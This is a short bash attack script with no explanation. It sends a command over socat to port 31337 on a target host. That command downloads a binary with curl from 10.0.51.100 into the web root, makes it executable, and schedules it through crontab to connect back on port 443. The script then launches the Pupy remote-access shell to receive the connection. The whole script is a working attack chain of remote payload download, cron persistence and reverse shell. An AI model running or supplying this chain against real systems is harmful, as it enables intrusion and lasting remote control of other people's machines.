#!/bin/bash

MIN=$(date --date="now + 1 minutes" +"%M")
HOU=$(date --date="now + 1 minutes" +"%H")

echo -e "curl http://10.0.51.100/pp -o /var/www/html/pp; chmod 777 /var/www/html/pp; echo \"${MIN} ${HOU} * * *  /var/www/html/pp simple --host 10.0.51.100:443\" > /tmp/mycron; crontab /tmp/mycron"
echo -e "curl http://10.0.51.100/pp -o /var/www/html/pp; chmod 777 /var/www/html/pp; echo \"${MIN} ${HOU} * * *  /var/www/html/pp simple --host 10.0.51.100:443\" > /tmp/mycron; crontab /tmp/mycron" | socat - TCP:10.0.51.101:31337
python /root/pupy/pupy/pupysh.py


